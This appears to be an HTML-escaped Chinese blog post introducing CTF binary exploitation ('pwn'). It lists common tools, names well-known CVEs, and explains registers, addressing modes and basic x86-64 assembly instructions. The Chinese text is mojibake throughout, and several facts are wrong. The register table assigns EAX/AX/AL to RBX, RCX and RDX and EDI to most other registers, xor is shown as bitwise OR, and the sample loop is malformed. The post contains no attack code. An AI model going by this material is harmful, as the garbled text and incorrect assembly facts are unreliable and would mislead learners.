&lt;p&gt;&lt;strong&gt;Pwnä¼ ç»Ÿå‡ºé¢˜æ–¹å‘ï¼šglibc PWNï¼šå †ã€æ ˆã€shellcodeç¼–å†™ã€iofileç­‰ã€‚è¿›é˜¶ï¼šarmæ¶æ„ã€loTã€å†…æ ¸ã€vmã€æµè§ˆå™¨ç­‰ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰€éœ€å·¥å…·ï¼špwntoolsã€pwndbgã€IDAã€è™šæ‹Ÿæœºï¼ˆUbuntuæˆ–Kaliï¼‰ã€LibcSearcherã€ropper&amp;amp;ROPgadgetsã€one_gadgetã€Ruby&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å®é™…ç”Ÿæ´»ä¸­æˆ‘ä»¬ä¼šé‡åˆ°çš„pwnï¼š&lt;/p&gt;
&lt;p&gt;æ³„éœ²é€šä¿¡æ•°æ®ï¼šå¿ƒè„æ»´è¡€ï¼ˆcve-2014-0160ï¼‰&lt;/p&gt;
&lt;p&gt;Linuxæœ¬åœ°ææƒrootï¼šè„ç‰›dirty cowï¼ˆcve-2016-5195ï¼‰&lt;/p&gt;
&lt;p&gt;Wannacryï¼šæ°¸æ’ä¹‹è“å‹’ç´¢ç—…æ¯’&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/glibc-pwn.png&#34;
	width=&#34;2010&#34;
	height=&#34;731&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/glibc-pwn_hu_76ead02599234b1.png 480w, https://expl0rer.top/p/pwn-1/glibc-pwn_hu_4c76d810cb42dfe6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;glibcå­¦ä¹ è·¯çº¿&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;659px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-error&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;PWNå…¥é—¨åŠé€€é›†&amp;hellip;&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;æ±‡ç¼–è¯­è¨€åŸºç¡€&#34;&gt;æ±‡ç¼–è¯­è¨€åŸºç¡€
&lt;/h2&gt;&lt;p&gt;æˆ‘è‡ªå·±åœ¨æ‰“ctfé€†å‘å’Œpwnï¼Œä¹Ÿæ—¶å¸¸æä¸æ‡‚bitå’Œbyteï¼Œåœ¨è¿™é‡Œæˆ‘å…ˆæŠŠä¸€äº›è®¡ç®—æœºå†…çš„é‡è¯å›å¿†ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;åç§°&lt;/th&gt;
          &lt;th&gt;ç¿»è¯‘&lt;/th&gt;
          &lt;th&gt;å¤§å°&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;bit&lt;/td&gt;
          &lt;td&gt;æ¯”ç‰¹&lt;/td&gt;
          &lt;td&gt;1ä½ï¼ˆ1bï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;byte&lt;/td&gt;
          &lt;td&gt;å­—èŠ‚&lt;/td&gt;
          &lt;td&gt;8ä½ï¼ˆ1Bï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;word&lt;/td&gt;
          &lt;td&gt;å­—&lt;/td&gt;
          &lt;td&gt;16ä½&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dword&lt;/td&gt;
          &lt;td&gt;åŒå­—&lt;/td&gt;
          &lt;td&gt;32ä½&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;qword&lt;/td&gt;
          &lt;td&gt;å››å­—&lt;/td&gt;
          &lt;td&gt;64ä½&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;è®¡ç®—æœºå¯»å€æ–¹å¼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å½“å‰ä¸»æµçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œéƒ½æ˜¯ä»¥å­—èŠ‚ï¼ˆBï¼‰ä¸ºå¯»å€å•ä½è¿›è¡Œå¯»å€ã€‚&lt;/p&gt;
&lt;p&gt;æ„å‘³ç€è®¡ç®—æœºè®¿é—®çš„æœ€å°å•ä½æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼ˆBï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;ç±»æ¯”äºäººå£æ™®æŸ¥ï¼Œæ™®æŸ¥å‘˜ä»¥æ¯æˆ·ï¼ˆB)ä¸ºå•ä½ç»Ÿè®¡ï¼Œè€Œä¸æ˜¯è®¿é—®åˆ°ä¸ªäººï¼ˆbï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¯„å­˜å™¨&#34;&gt;å¯„å­˜å™¨
&lt;/h3&gt;&lt;p&gt;è®¡ç®—æœºçš„æŒ‡ä»¤éƒ½æ˜¯ç”±CPUæ¥æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è®¡ç®—æœºç³»ç»Ÿç»“æ„ä¸­ï¼ŒCPUå’Œå†…å­˜æ˜¯åˆ†å¼€çš„ã€‚&lt;/p&gt;
&lt;p&gt;å¯„å­˜å™¨å­˜åœ¨äºCPUä¸­ï¼Œæ˜¯CPUçš„ç›´æ¥æ“ä½œå¯¹è±¡ã€‚&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;å¯„å­˜å™¨åç§°&lt;/th&gt;
          &lt;th&gt;ä½œç”¨&lt;/th&gt;
          &lt;th&gt;å¤‡æ³¨&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;RAX&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEAXï¼›ä½16ä½ï¼šAXï¼›ä½8ä½ï¼šAL&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RBX&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEAXï¼›ä½16ä½ï¼šAXï¼›ä½8ä½ï¼šAL&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RCX&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEAXï¼›ä½16ä½ï¼šAXï¼›ä½8ä½ï¼šAL&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RDX&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEAXï¼›ä½16ä½ï¼šAXï¼›ä½8ä½ï¼šAL&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RDI&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RSI&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R8&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R9&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R10&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R11&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R12&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R13&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R14&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;R15&lt;/td&gt;
          &lt;td&gt;é€šç”¨å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šEDI&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RSP&lt;/td&gt;
          &lt;td&gt;æ ˆé¡¶æŒ‡é’ˆ&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šESP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RBP&lt;/td&gt;
          &lt;td&gt;æ ˆåº•æŒ‡é’ˆ&lt;/td&gt;
          &lt;td&gt;ä½32ä½ï¼šESP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;EFLAGS&lt;/td&gt;
          &lt;td&gt;æ ‡å¿—å¯„å­˜å™¨&lt;/td&gt;
          &lt;td&gt;è®°å½•æ ‡å¿—çŠ¶æ€ï¼ŒåŒ…æ‹¬AFã€PFã€SFã€ZFã€OFã€CFç­‰æ ‡è¯†ä½&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RIP&lt;/td&gt;
          &lt;td&gt;æŒ‡ä»¤è®¡æ•°å™¨&lt;/td&gt;
          &lt;td&gt;ä¿å­˜ä¸‹ä¸€æ¡å°†ä¼šæ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ä¸Šè¿°çš„é€šç”¨å¯„å­˜å™¨ï¼Œé€šå¸¸ç”¨äºå‚æ•°ä¼ é€’ä»¥åŠç®—æ•°è¿ç®—ç­‰é€šç”¨åœºåˆã€‚&lt;/p&gt;
&lt;p&gt;RSPä¸ºæ ˆé¡¶æŒ‡é’ˆï¼ŒRBPä¸ºæ ˆåº•æŒ‡é’ˆï¼ŒäºŒè€…ç”¨äºç»´æŠ¤ç¨‹åºè¿è¡Œæ—¶çš„å‡½æ•°æ ˆï¼Œåœ¨ä¹‹åçš„è°ƒç”¨çº¦å®šä¸€èŠ‚ä¼šå¯¹å…¶è¿›è¡Œè®²è§£ã€‚&lt;/p&gt;
&lt;p&gt;EFLAGSä¸ºæ ‡å¿—ä½å¯„å­˜å™¨ï¼Œç”¨äºå­˜å‚¨CPUè¿è¡Œè®¡ç®—è¿‡ç¨‹ä¸­çš„çŠ¶æ€ï¼Œå¦‚è¿›ä½æº¢å‡ºç­‰ã€‚&lt;/p&gt;
&lt;p&gt;RIPæŒ‡é’ˆç”¨äºå­˜å‚¨CPUä¸‹ä¸€æ¡å°†ä¼šæ‰§è¡Œçš„æŒ‡é’ˆï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹,æ­£å¸¸æƒ…å†µä¸‹ä¼šæ¯ä¸€æ¬¡è¿è¡Œä¸€æ¡æŒ‡ä»¤è‡ªå¢ä¸€æ¡æŒ‡ä»¤çš„é•¿åº¦ï¼Œå½“å‘ç”Ÿè·³è½¬æ—¶æ‰ä¼šä»¥å…¶ä»–å½¢å¼æ”¹å˜å…¶å€¼ã€‚&lt;/p&gt;
&lt;h3 id=&#34;cpuçš„å¯»å€æ–¹å¼&#34;&gt;CPUçš„å¯»å€æ–¹å¼
&lt;/h3&gt;&lt;p&gt;å­¦è¿‡Cè¯­è¨€éƒ½çŸ¥é“æŒ‡é’ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒå­˜å‚¨çš„æ˜¯å¦ä¸€ä¸ªå˜é‡çš„å†…å­˜åœ°å€ï¼Œè€Œä¸æ˜¯ç›´æ¥å­˜å‚¨æ•°æ®æœ¬èº«ã€‚è¿™é‡Œè§£é‡Šçš„æ˜¯æ¯”è¾ƒå«ç³Šï¼Œè¯¦ç»†çš„è¿˜è¯·æœç´¢å¼•æ“ã€‚&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;å¯»å€æ–¹å¼&lt;/th&gt;
          &lt;th&gt;ç¤ºä¾‹&lt;/th&gt;
          &lt;th&gt;å®é™…è®¿é—®&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;ç«‹å³å¯»å€&lt;/td&gt;
          &lt;td&gt;1234h&lt;/td&gt;
          &lt;td&gt;1234hè¿™ä¸ªæ•°å­—æœ¬èº«&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ç›´æ¥å¯»å€&lt;/td&gt;
          &lt;td&gt;[1234h]&lt;/td&gt;
          &lt;td&gt;å†…å­˜åœ°å€1234h&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;å¯„å­˜å™¨å¯»å€&lt;/td&gt;
          &lt;td&gt;RAX&lt;/td&gt;
          &lt;td&gt;è®¿é—®RAXå¯„å­˜å™¨&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;å¯„å­˜å™¨é—´æ¥å¯»å€&lt;/td&gt;
          &lt;td&gt;[RAX]&lt;/td&gt;
          &lt;td&gt;è®¿é—®RAXå¯„å­˜å™¨å­˜å‚¨çš„å€¼çš„è¿™ä¸€å†…å­˜åœ°å€&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;å˜å€å¯»å€&lt;/td&gt;
          &lt;td&gt;[RAX+1234h]&lt;/td&gt;
          &lt;td&gt;è®¿é—®RAXå¯„å­˜å™¨å­˜å‚¨çš„å€¼+1234hè¿™ä¸€å†…å­˜åœ°å€&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;æ±‡ç¼–æŒ‡ä»¤&#34;&gt;æ±‡ç¼–æŒ‡ä»¤
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;æŒ‡ä»¤ç±»å‹&lt;/th&gt;
          &lt;th&gt;æ“ä½œç &lt;/th&gt;
          &lt;th&gt;ä¾‹å­ï¼ˆIntelæ ¼å¼ï¼‰&lt;/th&gt;
          &lt;th&gt;å®é™…æ•ˆæœ&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;æ•°æ®ä¼ é€æŒ‡ä»¤&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;mov&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;mov rax rbx&lt;/td&gt;
          &lt;td&gt;rax = rbx&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;å–åœ°å€æŒ‡ä»¤&lt;/td&gt;
          &lt;td&gt;lea&lt;/td&gt;
          &lt;td&gt;lex rax [rbx]&lt;/td&gt;
          &lt;td&gt;rax =&amp;amp;*rbx&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ç®—æ•°è¿ç®—æŒ‡ä»¤+&lt;/td&gt;
          &lt;td&gt;add&lt;/td&gt;
          &lt;td&gt;add rax rbx&lt;/td&gt;
          &lt;td&gt;rax = rax + rbx&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-&lt;/td&gt;
          &lt;td&gt;sub&lt;/td&gt;
          &lt;td&gt;sub rax rbx&lt;/td&gt;
          &lt;td&gt;rax = rax - rbx&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;é€»è¾‘è¿ç®—æŒ‡ä»¤&lt;/td&gt;
          &lt;td&gt;and&lt;/td&gt;
          &lt;td&gt;and rax rbx&lt;/td&gt;
          &lt;td&gt;rax = rax&amp;amp;rbx&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;xor&lt;/td&gt;
          &lt;td&gt;xor rax rbx&lt;/td&gt;
          &lt;td&gt;rax = rax | rbx&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;å‡½æ•°è°ƒç”¨æŒ‡ä»¤&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;call&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;call 1234h&lt;/td&gt;
          &lt;td&gt;æ‰§è¡Œå†…å­˜åœ°å€1234hå¤„çš„å‡½æ•°&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;å‡½æ•°è¿”å›æŒ‡ä»¤&lt;/td&gt;
          &lt;td&gt;ret&lt;/td&gt;
          &lt;td&gt;ret&lt;/td&gt;
          &lt;td&gt;å‡½æ•°è¿”å›&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;æ¯”è¾ƒ&lt;/td&gt;
          &lt;td&gt;cmp&lt;/td&gt;
          &lt;td&gt;cmp rax rbx&lt;/td&gt;
          &lt;td&gt;æ¯”è¾ƒraxä¸rbxï¼Œç»“æœä¿å­˜åœ¨EFLAGå¯„å­˜å™¨&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;æ— æ¡ä»¶è·³è½¬&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;jmp&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;jmp 1234h&lt;/td&gt;
          &lt;td&gt;eip = 1234h&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;æ ˆæ“ä½œæŒ‡ä»¤&lt;/td&gt;
          &lt;td&gt;push&lt;/td&gt;
          &lt;td&gt;push rax&lt;/td&gt;
          &lt;td&gt;å°†raxå­˜å‚¨çš„å€¼å‹æ ˆ&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;pop&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;pop rax&lt;/td&gt;
          &lt;td&gt;å°†æ ˆé¡¶çš„å€¼èµ‹å€¼ç»™raxï¼Œrsp+=8&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ä¸éš¾å‘ç°ä¸¤ä¸ªæ“ä½œæ•°æŒ‡ä»¤çš„ç›®çš„å¯„å­˜å™¨éƒ½æ˜¯ç¬¬ä¸€ä¸ªå¯„å­˜å™¨ï¼Œåˆšå¼€å§‹çœ‹çš„è¯æœ‰äº›å¥‡æ€ªã€‚&lt;/p&gt;
&lt;p&gt;ç»†å¿ƒçš„åŒå­¦å¯èƒ½ä¼šæ³¨æ„åˆ°callå’ŒjmpæŒ‡ä»¤çœ‹èµ·æ¥æ•ˆæœéƒ½ä¸€æ ·ï¼Œä½†æ˜¯æè¿°å´æœ‰äº›ä¸åŒï¼Œcallçš„è¯æ˜¯å‡½æ•°è°ƒç”¨ï¼Œéœ€è¦ä¸€äº›å‡½æ•°åœ°å€çš„ä¿å­˜å‹æ ˆå‚æ•°ä¼ é€’çš„æ“ä½œï¼Œè€ŒjmpæŒ‡ä»¤ç±»ä¼¼äºCã€Pythonè¯­è¨€çš„å‡½æ•°ä¸­çš„ifã€elseè¯­å¥ï¼Œåªæ¶‰åŠè·³è½¬ï¼Œä¸èƒ½ä½œä¸ºå‡½æ•°è°ƒç”¨æ¥ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¦å¤–åœ¨popæ—¶rspä¸ºä½•æ˜¯+8è€Œä¸æ˜¯-8ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;p&gt;ä¸Šè¿°é—®é¢˜ç•™åˆ°ä¹‹åçš„&lt;strong&gt;è°ƒç”¨çº¦å®š&lt;/strong&gt;ä¸­è®²è§£&amp;hellip;&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;äº†è§£åˆ°ä¸Šè¿°æ±‡ç¼–è¯­è¨€åï¼Œæ„Ÿè§‰ç”Ÿè¯ç‰¹åˆ«å¤šï¼Œè¿™å¯¹æˆ‘æ„Ÿè§‰ä¹Ÿæ˜¯ï¼Œä¸è¿‡æˆ‘å»ºè®®è¿˜æ˜¯å­¦è¿‡Cè¯­è¨€å’Œæœ‰ä¸€ç‚¹å…¥é—¨Pythonä¹‹åå†å»çœ‹æ±‡ç¼–è¯­è¨€ï¼Œä¸ç„¶ä¼šå¾ˆåç‰¢çš„ï¼Œå› ä¸ºï¼š&lt;/p&gt;
&lt;p&gt;è®¡ç®—æœºåœ¨æ‰§è¡Œæ±‡ç¼–ä»£ç æ—¶ï¼Œåªä¼šé¡ºåºæ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡&lt;strong&gt;call&lt;/strong&gt;ã€&lt;strong&gt;jmp&lt;/strong&gt;ã€&lt;strong&gt;ret&lt;/strong&gt;è¿™ç§æŒ‡ä»¤æ¥å®Œæˆè·³è½¬ï¼Œæ‰€ä»¥æ±‡ç¼–æŒ‡ä»¤ä»£ç çš„æ‰§è¡Œæµå¹¶ä¸åƒé«˜çº§è¯­è¨€ç¨‹åºä¸€æ ·æµç¨‹æ˜ç¡®ã€‚ï¼ˆåœ¨å­¦ä¹ äº†Cè¯­è¨€çš„æŒ‡é’ˆè¿™å—çš„çŸ¥è¯†ç‚¹ï¼Œè¿™ä¼šè®©ä½ å­¦æ±‡ç¼–æ¯”è¾ƒæœ‰åˆ©çš„ï¼‰&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ±‡ç¼–æŒ‡ä»¤ä»£ç ä¼šç»å¸¸è·³è½¬å¯¼è‡´å¯è¯»æ€§å·®ä¸€äº›ï¼Œä½†æ‰§è¡Œæ•ˆæœæ˜¯å’Œé«˜çº§è¯­è¨€ï¼ˆCã€Pythonè¯­è¨€ï¼‰å·®ä¸å¤šçš„ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;ç»™ç‚¹è¡¨æ ¼å¤ªæ‡µäº†ï¼Œæˆ‘åˆ—å‡ºäº›ä¾‹å­(assembly&amp;ndash;C)æ¥çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;int a = 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;label1&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;æ ‡ç­¾1ï¼Œæ ‡ç­¾æ ‡å¿—ä½œç”¨ï¼Œç”¨äºæ ‡è®°ä»£ç ä¸­çš„æŸä¸ªä½ç½®ï¼Œæ–¹ä¾¿ç¨‹åºè·³è½¬æˆ–å¼•ç”¨ï¼Œæ ‡ç­¾æœ¬èº«ä¸æ‰§è¡Œä»»ä½•æ“ä½œï¼Œä»…ä½œä¸ºä¸€ä¸ª â€œæ ‡è®°ç‚¹â€ï¼Œé…åˆè·³è½¬æŒ‡ä»¤jmpã€jneï¼ˆä¾‹å¦‚Cä¸­çš„gotoä½œç”¨ï¼‰ï¼Œå®ç°ç¨‹åºæµç¨‹çš„æ§åˆ¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;inc&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;a++ã€a = a + 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;loop&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;å¾ªç¯ä½“çš„è·³è½¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;æ¯”è¾ƒraxå’Œ100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;jge&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;label2&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;if a&amp;gt;= 100, breakï¼›è¿™é‡Œå°±æ˜¯aå¤§äºæˆ–ç­‰äº100ï¼Œå°±è·³è½¬åˆ°label2æ ‡ç­¾ä¸‹çš„å‡½æ•°ï¼Œå¦åˆ™å°±æ˜¯å°äº100ï¼ˆjmpï¼‰è·³è½¬åˆ°label1ä¸‹ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;jmp&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;label1&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;loop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;label2&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;æ ‡ç­¾2&lt;/span&gt;
